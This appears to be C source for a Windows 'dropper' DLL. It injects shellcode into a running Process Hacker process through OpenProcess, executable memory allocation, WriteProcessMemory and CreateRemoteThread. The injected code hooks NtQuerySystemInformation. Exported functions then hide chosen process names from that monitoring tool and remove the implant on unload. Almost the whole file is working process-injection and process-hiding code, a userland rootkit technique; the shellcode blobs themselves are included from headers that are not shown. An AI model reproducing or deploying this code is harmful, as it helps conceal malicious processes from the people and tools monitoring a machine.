#include "dropperDLL.h"

#include <TlHelp32.h>

#include <stdio.h>
#include <string.h>

#include "ph_implant.x64.bin.h"
#include "ph_implant_hooked_func.x64.bin.h"

DWORD dwTargetPID = -1;
HANDLE hTargetProc = INVALID_HANDLE_VALUE;
HANDLE hStdOut = INVALID_HANDLE_VALUE;
LPVOID lpvPhImplantMem = NULL;
LPVOID lpvPhHookedMem = NULL;

typedef struct _global_data_implant
{
    DWORD64 dwNtQuerySystemInformation;
    DWORD64 dwVirtualProtect;
    DWORD64 dwGetModuleHandleA;
    DWORD64 dwLoadLibraryA;
    DWORD64 dwImageDirectoryEntryToDataEx;
    DWORD64 dwOutputDebugStringA;
    DWORD64 dwHookedMem;
} GLOBAL_DATA_IMPLANT, *PGLOBAL_DATA_IMPLANT;

typedef struct _global_data_hooked
{
    DWORD64 dwNtQuerySystemInformation;
    DWORD64 dwOutputDebugStringA;
} GLOBAL_DATA_HOOKED, *PGLOBAL_DATA_HOOKED;

#define MAX_PROC_COUNT 8

typedef struct _proc_names
{
    DWORD64 dwProcNameCount;
    CHAR cProcNames[8][20];
} PROC_DATA, *PPROC_DATA;

GLOBAL_DATA_IMPLANT global_data_implant;
GLOBAL_DATA_HOOKED global_data_hooked;

PROC_DATA proc_data;

DWORD FindTargetPID(LPSTR lpProcName)
{
    DWORD dwRetVal = -1;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32 pe = {.dwSize = sizeof(pe)};
    if (!Process32First(hSnapshot, &pe))
    {
        return dwRetVal;
    }

    do
    {
        if (strcmp(lpProcName, pe.szExeFile) == 0)
        {
            return pe.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe));

    return dwRetVal;
}

__declspec(dllexport) void insert_ph_implant(void)
{
    if (hStdOut == INVALID_HANDLE_VALUE)
    {
        hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    }

    WriteFile(hStdOut, "insert_ph_implant\n", (DWORD)strlen("insert_ph_implant\n"), NULL, NULL);

    if (lpvPhImplantMem != NULL)
    {
        CHAR cMsg[100] = "Implant already inserted\n";
        WriteFile(hStdOut, cMsg, (DWORD)strlen(cMsg), NULL, NULL);

        return;
    }

    if (dwTargetPID == -1)
    {
        dwTargetPID = FindTargetPID("ProcessHacker.exe");

        if (dwTargetPID == -1)
        {
            CHAR cMsg[100] = "Could not find ProcessHacker.exe\n";
            WriteFile(hStdOut, cMsg, (DWORD)strlen(cMsg), NULL, NULL);

            return;
        }
    }

    hTargetProc = OpenProcess(PROCESS_ALL_ACCESS, 0, dwTargetPID);

    if (hTargetProc == NULL)
    {
        CHAR buffer[100];
        sprintf_s(buffer, 100, "OpenProcess failed, %d\n", GetLastError());

        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
        return;
    }

    lpvPhImplantMem = VirtualAllocEx(hTargetProc, 0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpvPhImplantMem == NULL)
    {
        CHAR buffer[100];
        sprintf_s(buffer, 100, "VirtualAllocEx failed implant, %d\n", GetLastError());

        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
        return;
    }

    lpvPhHookedMem = VirtualAllocEx(hTargetProc, 0, ph_implant_hooked_func_x64_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpvPhHookedMem == NULL)
    {
        CHAR buffer[100];
        sprintf_s(buffer, 100, "VirtualAllocEx failed hooked mem, %d\n", GetLastError());

        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
        return;
    }

    if (!WriteProcessMemory(hTargetProc, lpvPhImplantMem, ph_implant_x64, (DWORD)ph_implant_x64_len, NULL))
    {
        CHAR buffer[100];
        sprintf_s(buffer, 100, "WriteProcessMemory failed ph_implant, %d\n", GetLastError());

        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
        return;
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32");
    HMODULE hNtdll = GetModuleHandleA("ntdll");
    HMODULE hDbgHelp = LoadLibraryA("dbgHelp");

    global_data_implant.dwNtQuerySystemInformation = (DWORD64)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    global_data_implant.dwVirtualProtect = (DWORD64)GetProcAddress(hKernel32, "VirtualProtect");
    global_data_implant.dwGetModuleHandleA = (DWORD64)GetProcAddress(hKernel32, "GetModuleHandleA");
    global_data_implant.dwLoadLibraryA = (DWORD64)GetProcAddress(hKernel32, "LoadLibraryA");
    global_data_implant.dwImageDirectoryEntryToDataEx = (DWORD64)GetProcAddress(hDbgHelp, "ImageDirectoryEntryToDataEx");
    global_data_implant.dwOutputDebugStringA = (DWORD64)GetProcAddress(hKernel32, "OutputDebugStringA");
    global_data_implant.dwHookedMem = (DWORD64)lpvPhHookedMem;

    if (!WriteProcessMemory(hTargetProc, (LPVOID)((ULONG_PTR)lpvPhImplantMem + ph_implant_x64_len + 176), &global_data_implant, (DWORD)sizeof(global_data_implant), NULL))
    {
        CHAR buffer[100];
        sprintf_s(buffer, 100, "WriteProcessMemory failed global_data_implant, %d\n", GetLastError());

        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
        return;
    }

    if (!WriteProcessMemory(hTargetProc, lpvPhHookedMem, ph_implant_hooked_func_x64, ph_implant_hooked_func_x64_len, NULL))
    {
        CHAR buffer[100];
        sprintf_s(buffer, 100, "WriteProcessMemory failed hooked mem, %d\n", GetLastError());

        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
        return;
    }

    global_data_hooked.dwNtQuerySystemInformation = global_data_implant.dwNtQuerySystemInformation;
    global_data_hooked.dwOutputDebugStringA = global_data_implant.dwOutputDebugStringA;

    if (!WriteProcessMemory(hTargetProc, (LPVOID)((ULONG_PTR)lpvPhHookedMem + ph_implant_hooked_func_x64_len + 168), &global_data_hooked, (DWORD)sizeof(global_data_hooked), NULL))
    {
        CHAR buffer[100];
        sprintf_s(buffer, 100, "WriteProcessMemory failed global_data_hooked, %d\n", GetLastError());

        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
        return;
    }
}

__declspec(dllexport) void hook_ph(void)
{
    if (hStdOut == INVALID_HANDLE_VALUE)
    {
        hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    }

    WriteFile(hStdOut, "hook_ph\n", (DWORD)strlen("hook_ph\n"), NULL, NULL);

    if (lpvPhImplantMem == NULL)
    {
        insert_ph_implant();
    }

    DWORD64 dwHook = 0;

    if (!WriteProcessMemory(hTargetProc, (LPVOID)((ULONG_PTR)lpvPhImplantMem + ph_implant_x64_len), &dwHook, 8, NULL))
    {
        CHAR buffer[100];

        sprintf_s(buffer, 100, "WriteProcessMemory failed hook action, %d\n", GetLastError());

        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
        return;
    }

    DWORD dwThreadID = 0;
    HANDLE hThread = CreateRemoteThread(hTargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpvPhImplantMem, NULL, 0, &dwThreadID);

    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    return;
}

__declspec(dllexport) void hide_process(LPSTR lpProcName)
{
    if (hStdOut == INVALID_HANDLE_VALUE)
    {
        hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    }

    char buffer[100];
    sprintf_s(buffer, 100, "hide process %s\n", lpProcName);
    WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);

    if (lpvPhHookedMem == NULL)
    {
        insert_ph_implant();
        hook_ph();
    }

    if (proc_data.dwProcNameCount == MAX_PROC_COUNT)
    {
        sprintf_s(buffer, 100, "Max proc count reached. Skipping...\n");
        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);

        return;
    }

    strcpy(proc_data.cProcNames[proc_data.dwProcNameCount++], lpProcName);

    if (!WriteProcessMemory(hTargetProc, (LPVOID)((ULONG_PTR)lpvPhHookedMem + ph_implant_hooked_func_x64_len), &proc_data, sizeof(proc_data), NULL))
    {
        CHAR buffer[100];
        sprintf_s(buffer, 100, "WriteProcessMemory failed proc_names, %d\n", GetLastError());

        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
        return;
    }
}

__declspec(dllexport) void show_process(LPSTR lpProcName)
{
    if (hStdOut == INVALID_HANDLE_VALUE)
    {
        hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    }

    char buffer[100];
    sprintf_s(buffer, 100, "show process %s\n", lpProcName);

    WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
}

__declspec(dllexport) void unhook_ph(void)
{
    if (hStdOut == INVALID_HANDLE_VALUE)
    {
        hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    }

    WriteFile(hStdOut, "unhook_ph\n", (DWORD)strlen("unhook_ph\n"), NULL, NULL);

    if (lpvPhImplantMem == NULL)
    {
        return;
    }

    DWORD64 dwUnHook = 1;

    if (!WriteProcessMemory(hTargetProc, (LPVOID)((ULONG_PTR)lpvPhImplantMem + ph_implant_x64_len), &dwUnHook, 8, NULL))
    {
        CHAR buffer[100];

        sprintf_s(buffer, 100, "WriteProcessMemory failed unhook action, %d\n", GetLastError());

        WriteFile(hStdOut, buffer, (DWORD)strlen(buffer), NULL, NULL);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hTargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpvPhImplantMem, NULL, 0, NULL);

    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    return;
}

__declspec(dllexport) void remove_ph_implant(void)
{
    if (hStdOut == INVALID_HANDLE_VALUE)
    {
        hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    }

    WriteFile(hStdOut, "remove_ph_implant\n", (DWORD)strlen("remove_ph_implant\n"), NULL, NULL);

    unhook_ph();

    if (lpvPhImplantMem != NULL)
    {
        VirtualFreeEx(hTargetProc, lpvPhImplantMem, 0, MEM_RELEASE);
        lpvPhImplantMem = NULL;
    }

    if (global_data_implant.dwHookedMem != 0)
    {
        VirtualFreeEx(hTargetProc, (LPVOID)global_data_implant.dwHookedMem, 0, MEM_RELEASE);
        lpvPhHookedMem = NULL;
    }

    CloseHandle(hTargetProc);
}

BOOL DllMain(HINSTANCE hInstance, DWORD fwdReason, LPVOID lpvReserved)
{
    switch (fwdReason)
    {
    case DLL_PROCESS_DETACH:
        remove_ph_implant();

        break;

    default:
        break;
    }

    return TRUE;
}